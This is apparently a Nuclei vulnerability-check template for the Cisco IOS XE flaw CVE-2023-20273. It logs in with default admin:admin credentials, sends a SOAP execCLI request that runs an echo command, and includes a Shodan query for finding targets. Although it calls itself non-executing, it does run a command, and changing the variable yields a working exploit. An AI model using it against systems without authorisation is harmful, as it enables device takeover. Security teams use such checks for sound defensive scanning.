payloads/CVE-2023-20273.yaml

id: CVE-2023-20273

info:
  name: Cisco IOS XE - Safe Vulnerability Check (CVE-2023-20273)
  author: nullenc0de
  severity: high
  description: |
    Safe check for CVE-2023-20273 in Cisco IOS XE devices. This template sends a benign SOAP request with no harmful command to determine if the target is likely vulnerable, without executing anything or causing side effects.
  reference:
    - https://github.com/NullEnc0de/CVE-2023-20273
    - https://www.rapid7.com/blog/post/2023/10/20/etr-cisco-ios-xe-cve-2023-20273-root-rce-exploitation/
  classification:
    cve-id: CVE-2023-20273
    cwe-id: CWE-78
    cvss-score: 10.0
  metadata:
    max-request: 1
    safe: true
    vendor: cisco
    product: ios_xe
    shodan-query: http.favicon.hash:-904700687
  tags: safe,cve,cisco,ios,rce,postauth,network,checkonly

variables:
  benign_cmd: 'echo TEST_CVE_2023_20273'

http:
  - raw:
      - |
        POST /webui_wsma_http HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64("admin:admin")}}
        Content-Type: text/xml
        Connection: close

        <?xml version="1.0" encoding="UTF-8"?>
        <SOAP-ENV:Envelope
          xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
          xmlns:xsd="http://www.w3.org/2001/XMLSchema"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xmlns:ns1="urn:cisco:wsma-exec">
          <SOAP-ENV:Body>
            <ns1:request correlator="exec1">
              <ns1:execCLI>
                <cmd>{{benign_cmd}}</cmd>
                <dialogue>
                  <expect></expect>
                  <reply></reply>
                </dialogue>
              </ns1:execCLI>
            </ns1:request>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

    matchers:
      - type: word
        part: body
        words:
          - "<execLog>"
          - "<text>"
          - "<received>"
        condition: and

    extractors:
      - type: regex
        part: body
        regex:
          - "<text>([\\s\\S]*?)</text>"
